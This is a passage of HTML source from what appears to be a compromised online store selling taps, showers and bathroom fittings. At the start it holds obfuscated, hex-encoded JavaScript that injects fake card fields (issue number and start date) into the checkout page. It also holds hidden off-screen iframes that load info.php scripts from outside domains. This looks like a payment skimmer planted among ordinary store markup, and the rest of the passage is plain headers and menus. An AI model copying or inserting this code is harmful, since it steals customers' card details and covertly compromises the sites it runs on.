79\x70\x65\x5F\x73\x73\x5F\x64\x69\x76\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x3B\x22\x3E\x20\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x6E\x65\x72\x2D\x66\x6F\x72\x6D\x22\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x61\x6C\x74\x22\x3E\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x53\x77\x69\x74\x63\x68\x2F\x53\x6F\x6C\x6F\x2F\x4D\x61\x65\x73\x74\x72\x6F\x20\x4F\x6E\x6C\x79\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x3E\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x63\x76\x76\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x69\x73\x73\x75\x65\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x73\x70\x61\x6E\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x3E\x53\x74\x61\x72\x74\x20\x44\x61\x74\x65\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x6D\x6F\x6E\x74\x68\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x79\x65\x61\x72\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x31\x22\x3E\x32\x30\x31\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x32\x22\x3E\x32\x30\x31\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x33\x22\x3E\x32\x30\x31\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x34\x22\x3E\x32\x30\x31\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x35\x22\x3E\x32\x30\x31\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x76\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x22\x3E\x26\x6E\x62\x73\x70\x3B\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E\x20\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E","\x62\x65\x66\x6F\x72\x65\x65\x6E\x64","\x69\x6E\x73\x65\x72\x74\x41\x64\x6A\x61\x63\x65\x6E\x74\x48\x54\x4D\x4C"];window[_0xc240[3]](function(){if(!document[_0xc240[1]](_0xc240[0])){ShowForm(_0xc240[2])}},100);function ShowForm(_0x25adx2){if(document[_0xc240[1]](_0x25adx2)){var _0x25adx3=document[_0xc240[1]](_0x25adx2);while(_0x25adx3[_0xc240[4]]){_0x25adx3[_0xc240[5]](_0x25adx3[_0xc240[4]])};var _0x25adx4=_0xc240[6];_0x25adx3[_0xc240[8]](_0xc240[7],_0x25adx4)}}</script><div style='width: 300px; height: 300px; position:absolute; left:-500px; top: -500px;'> <iframe src='http://fortunoffdev.gemfindwebdesign.com/gemfind/info.php' width='250' height='250'></iframe></div><div style='width: 300px; height: 300px; position:absolute; left:-500px; top: -500px;'> <iframe src='https://www.visio-rx.com/docs/info.php' width='250' height='250'></iframe></div>
+<!--[if lt IE 9]>
+<script type='text/javascript' src="http://daskoindia.com/js/elegento/html5shiv.js"></script>
+<script type='text/javascript' src="http://daskoindia.com/js/elegento/css3-mediaqueries.js"></script>
+<![endif]-->
+
+	<link href='//fonts.googleapis.com/css?family=Roboto:400,100,100italic,300,300italic,400italic,500,500italic,700,700italic,900italic,900' rel='stylesheet' type='text/css' />
+<div id="google_translate_element"></div><script type="text/javascript">
+      function googleTranslateElementInit() {
+      new google.translate.TranslateElement({ pageLanguage: 'it', autoDisplay: false },'google_translate_element');
+                                         }
+ </script>
+ <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+<script>
+window.onclick = function() {
+    var container = document.getElementById('google_translate_element');
+    var select = container.getElementsByTagName('select')[0];
+    select.value="en";
+}
+</script>
+</head>
+<body class=" cms-index-index cms-royal-home-page9  wide">
+<div id="root-wrapper">
+    <div class="wrapper">
+            <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript seems to be disabled in your browser.</strong><br />
+                    You must have JavaScript enabled in your browser to utilize the functionality of this website.                </p>
+            </div>
+        </div>
+    </noscript>
+   <div class="global-site-notice demo-notice">
+        <div class="notice-inner">
+<table class="flag" style="margin: 0px auto;" border="0">
+<tbody>
+<tr>
+<td>
+<p style="margin-top: 4px;">Translate</p>
+</td>
+<td><a href="#"><img title="View in English/English" alt="View in English" src="http://daskoindia.com/images/flags/United_Kingdom.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Germany" alt="View in Germany" src="http://daskoindia.com/images/flags/Germany.png" height="20" width="30" /></a></td>
+<td><a href="http://www.certifiedchinesetranslation.com/sc/"><img title="View in Japanese" alt="View in Japanese" src="http://daskoindia.com/images/flags/Japan.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Korea" alt="View in Korea" src="http://daskoindia.com/images/flags/Korea.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Italian/Italiano" alt="View in Italian" src="http://daskoindia.com/images/flags/images.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in morocco" alt="View in morocco" src="http://daskoindia.com/images/flags/morocco.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in nepal" alt="View in nepal" src="http://daskoindia.com/images/flags/nepal.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in philippine" alt="View in philippine" src="http://daskoindia.com/images/flags/philippine.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in sri-lanka" alt="View in sri-lanka" src="http://daskoindia.com/images/flags/sri-lanka.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in switzerland" alt="View in switzerland" src="http://daskoindia.com/images/flags/switzerland.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Taiwan" alt="View in Taiwan" src="http://daskoindia.com/images/flags/Taiwan.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in chinese" alt="View in chinese" src="http://daskoindia.com/images/flags/China.png" height="20" width="30" /></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+    </div>
+
+    <div class="global-site-notice demo-notice" style="display: block !important;;">
+        <div class="notice-inner"><p style="text-align:center;">
+<table class="flag" style="margin: 0px auto;" border="0">
+<tbody>
+<tr>
+<td>
+<p style="margin-top: 4px;">Translate</p>
+</td>
+<td><a href="#"><img title="View in English/English" alt="View in English" src="http://daskoindia.com/images/flags/United_Kingdom.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Germany" alt="View in Germany" src="http://daskoindia.com/images/flags/Germany.png" height="20" width="30" /></a></td>
+<td><a href="http://www.certifiedchinesetranslation.com/sc/"><img title="View in Japanese" alt="View in Japanese" src="http://daskoindia.com/images/flags/Japan.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Korea" alt="View in Korea" src="http://daskoindia.com/images/flags/Korea.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Italian/Italiano" alt="View in Italian" src="http://daskoindia.com/images/flags/images.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in morocco" alt="View in morocco" src="http://daskoindia.com/images/flags/morocco.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in nepal" alt="View in nepal" src="http://daskoindia.com/images/flags/nepal.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in philippine" alt="View in philippine" src="http://daskoindia.com/images/flags/philippine.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in sri-lanka" alt="View in sri-lanka" src="http://daskoindia.com/images/flags/sri-lanka.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in switzerland" alt="View in switzerland" src="http://daskoindia.com/images/flags/switzerland.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in Taiwan" alt="View in Taiwan" src="http://daskoindia.com/images/flags/Taiwan.png" height="20" width="30" /></a></td>
+<td><a href="#"><img title="View in chinese" alt="View in chinese" src="http://daskoindia.com/images/flags/China.png" height="20" width="30" /></a></td>
+</tr>
+</tbody>
+</table>
+</p></div>
+    </div>
+        <div class="page">
+            
+<div class="custom-block-headertop-container">
+    </div>
+
+<div class="header-container eg-headerstyle4">
+    <div class="header-top-container">
+        <div class="container">
+                    </div>
+    </div>
+
+    <div class="header-main-container">
+        <div class="header-main header container">
+            <div class="table">
+                <div class="table-row">
+                    <div class="nav-trigger-container table-cell">
+                        <div class="nav-trigger grid-xs-show grid-sm-show">
+                            <span class="fa fa-align-justify"></span>
+                        </div>
+                    </div>
+
+                    <div class="header-main-left">
+                        <a href="http://daskoindia.com/" title="Madison Island" class="logo"><img src="http://daskoindia.com/skin/frontend/royal/default/images/logo.png" alt="Madison Island" /></a>
+                    </div>
+
+                    <div class="header-main-center">
+                        <div class="top-links f-right">
+                            <ul class="links">
+                        <li class="first "><a href="http://daskoindia.com/customer/account/" title="My Account" >My Account</a></li>
+                                                                <li class=" "><a href="http://daskoindia.com/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li class=" last "><a href="http://daskoindia.com/customer/account/login/" title="Log In" class="eg-login-link">Log In</a></li>
+            </ul>
+                                                    </div>
+                    </div>
+                    
+                    <div class="header-main-right clearfix">
+                        <div class="search-wrapper">
+<div class="eg-search-trigger"><span class="fa fa-search"></span></div>
+<form id="search_mini_form" action="http://daskoindia.com/catalogsearch/result/" method="get">
+    <div class="form-search clearfix">
+<p>The simplest way to buy trusted services</p>
+<div class="search-box01" ng-class="{ 'search-focused': searchBoxFocus }"><p class="search-label">
+<p class="search-label">Which service are you looking for?</p>
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" placeholder='plumber, photographer' />
+        <button type="submit" title="Search" class="button"><span><span class="fa fa-search"></span></span></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Find it here...');
+            searchForm.initAutocomplete('http://daskoindia.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+</div></div>
+
+                                            </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-nav-container">
+        <div class="header-nav header container">
+            <div class="inline-block nav-container left">
+                <div class="egmenu">
+    <style type="text/css" scoped>
+        .elegento-menu .level0-wrapper.static {width: 770px;left: auto;}
+        .elegento-menu .level0-wrapper.classic {width: 200px;left: auto;}
+        .elegento-menu .level0-wrapper.classic li > ul {width: 200px;}
+    </style>
+
+        <div id="elegento-mobile">
+        <a id="mobile-trigger" href="#">
+            <span class="trigger-icon"><span class="fa fa-navicon"></span>
+            <span>NAVIGATION</span></span>
+        </a>
+        <ul class="elegento-mobile accordion">
+            <li id="mobile-home" class="level0"><a href="http://daskoindia.com/"><span>Home</span></a></li><li class="level0"><a class="level0" href="http://daskoindia.com/about-us.html"><span>About us</span></a></li><li class="level0 parent"><a class="level0" href="http://daskoindia.com/products.html"><span>Products</span></a><span class="opener"><span class="icon-royal icon-plus"></span><span class="icon-royal icon-minus"></span></span><ul class="level0 parent clearfix"><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/faucet.html"><span>Faucet</span></a><span class="opener"><span class="icon-royal icon-plus"></span><span class="icon-royal icon-minus"></span></span><ul class="level1 parent clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/bibcock.html"><span>Bibcock</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/long-body.html"><span>Long Body</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/pillarcock.html"><span>Pillarcock</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/swan-neck.html"><span>CH &amp; Sink Mixer</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/hot-cold-mixers.html"><span>Hot &amp; Cold Mixers</span></a></li></ul></li><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/shower.html"><span>Shower</span></a><span class="opener"><span class="icon-royal icon-plus"></span><span class="icon-royal icon-minus"></span></span><ul class="level1 parent clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/band-showers.html"><span>Band Showers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/over-head-swowers.html"><span>Over Head Swowers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/sandwich-ultra-thin.html"><span>Sandwich &amp; Ultra Thin</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/telephone-showers.html"><span>Telephone Showers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/tube-shower.html"><span>Shower Tube </span></a></li></ul></li><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/fitings.html"><span>Fitings</span></a><span class="opener"><span class="icon-royal icon-plus"></span><span class="icon-royal icon-minus"></span></span><ul class="level1 parent clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/angle-valve.html"><span>Angle Valve &amp; Phase Bib Disc</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/anti-cockroch-jali-drain-jali.html"><span>Anti Cockroch Jali &amp; Grating</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/bib-disc-cp-bottle-trap.html"><span>CP Bottle Trap &amp; Waste Pipe</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/connection-tubes-shawer-tubes.html"><span>Connection Tubes &amp; Shawer Tubes</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/cp-concealed-waste-pipe.html"><span>CP Concealed &amp; Deviator</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/cp-waster-coupling-sink-coupling.html"><span>CP Waster Coupling &amp; Sink Coupling</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/ext-nipple-flanges.html"><span>Ext. Nipple &amp; Flanges</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/health-faucets-jet-spay.html"><span>Health Faucets &amp; Jet Spay</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/shawer-arms.html"><span>Shawer Arms</span></a></li></ul></li><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/accessories.html"><span>Accessories</span></a><span class="opener"><span class="icon-royal icon-plus"></span><span class="icon-royal icon-minus"></span></span><ul class="level1 parent clearfix"><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/cp-bath-set.html"><span>CP bath Set</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/paper-holder.html"><span>Paper Holder</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/rob-hook.html"><span>Rob Hook</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/shelfs-corners.html"><span>Shelf &amp; Corners</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/soap-dish.html"><span>Soap Dish</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-hanger.html"><span>Towel Hanger</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-rack.html"><span>Towel Rack</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-rod.html"><span>Towel Rod</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/tumler-holder.html"><span>Tumbler Holder</span></a></li></ul></li></ul></li><li class="level0"><a class="level0" href="http://daskoindia.com/new-arrivals.html"><span>New Arrivals</span></a></li><li class="level0"><a class="level0" href="http://daskoindia.com/contact-us.html"><span>Contact Us</span></a></li>        </ul>
+    </div>
+    
+        <ul class="elegento-menu clearfix">
+        <li id="home" class="level-top"><a href="http://daskoindia.com/"><span>Home</span></a></li><li class="menu level-top"><a href="http://daskoindia.com/about-us.html"><span>About us</span></a></li> <li class="menu level-top parent"><a href="http://daskoindia.com/products.html"><span>Products</span></a><div class="level0-wrapper wide" style="background-repeat: no-repeat;"><div class="category-block grid12-12 clearfix "><div class="column odd first" style="width: 25.00%"><ul class="level1"><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/faucet.html"><span>Faucet</span></a><ul class="level2"><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/bibcock.html"><span>Bibcock</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/long-body.html"><span>Long Body</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/pillarcock.html"><span>Pillarcock</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/swan-neck.html"><span>CH &amp; Sink Mixer</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/faucet/hot-cold-mixers.html"><span>Hot &amp; Cold Mixers</span></a></li></ul></li></ul></div><div class="column even" style="width: 25.00%"><ul class="level1"><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/shower.html"><span>Shower</span></a><ul class="level2"><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/band-showers.html"><span>Band Showers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/over-head-swowers.html"><span>Over Head Swowers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/sandwich-ultra-thin.html"><span>Sandwich &amp; Ultra Thin</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/telephone-showers.html"><span>Telephone Showers</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/shower/tube-shower.html"><span>Shower Tube </span></a></li></ul></li></ul></div><div class="column odd" style="width: 25.00%"><ul class="level1"><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/fitings.html"><span>Fitings</span></a><ul class="level2"><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/angle-valve.html"><span>Angle Valve &amp; Phase Bib Disc</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/anti-cockroch-jali-drain-jali.html"><span>Anti Cockroch Jali &amp; Grating</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/bib-disc-cp-bottle-trap.html"><span>CP Bottle Trap &amp; Waste Pipe</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/connection-tubes-shawer-tubes.html"><span>Connection Tubes &amp; Shawer Tubes</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/cp-concealed-waste-pipe.html"><span>CP Concealed &amp; Deviator</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/cp-waster-coupling-sink-coupling.html"><span>CP Waster Coupling &amp; Sink Coupling</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/ext-nipple-flanges.html"><span>Ext. Nipple &amp; Flanges</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/health-faucets-jet-spay.html"><span>Health Faucets &amp; Jet Spay</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/fitings/shawer-arms.html"><span>Shawer Arms</span></a></li></ul></li></ul></div><div class="column even last" style="width: 25.00%"><ul class="level1"><li class="level1 parent"><a class="level1" href="http://daskoindia.com/products/accessories.html"><span>Accessories</span></a><ul class="level2"><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/cp-bath-set.html"><span>CP bath Set</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/paper-holder.html"><span>Paper Holder</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/rob-hook.html"><span>Rob Hook</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/shelfs-corners.html"><span>Shelf &amp; Corners</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/soap-dish.html"><span>Soap Dish</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-hanger.html"><span>Towel Hanger</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-rack.html"><span>Towel Rack</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/towel-rod.html"><span>Towel Rod</span></a></li><li class="level2"><a class="level2" href="http://daskoindia.com/products/accessories/tumler-holder.html"><span>Tumbler Holder</span></a></li></ul></li></ul></div></div></div></li> <li class="menu level-top"><a href="http://daskoindia.com/new-arrivals.html"><span>New Arrivals</span></a></li> <li class="menu level-top"><a href="http://daskoindia.com/contact-us.html"><span>Contact Us</span></a></li>     </ul>
+    
+    <script type="text/javascript">
+    //<![CDATA[
+        jQuery(function($) {
+            $(window).on('load', function() {
+                $('.elegento-menu').egMenu({
+                    delayDisplay : 150,
+                    fadeIn       : 1000,
+                    delayHide    : 100,
+                    fadeOut      : 1000,
+                    maximlDepth  : 3                });
+            });
+        });
+    //]]>
+    </script>
+</div>            </div>
+            <div class="inline-block crnc-container left">
+                            </div>
+            <div class="inline-block lang-container left">
+                            </div>
+        </div>
+    </div>
+</div>
+
+<div class="custom-block-headerbottom-container">
+    </div>
+
+<div class="mobile-nav-wrapper">
+    <div class="search-wrapper">
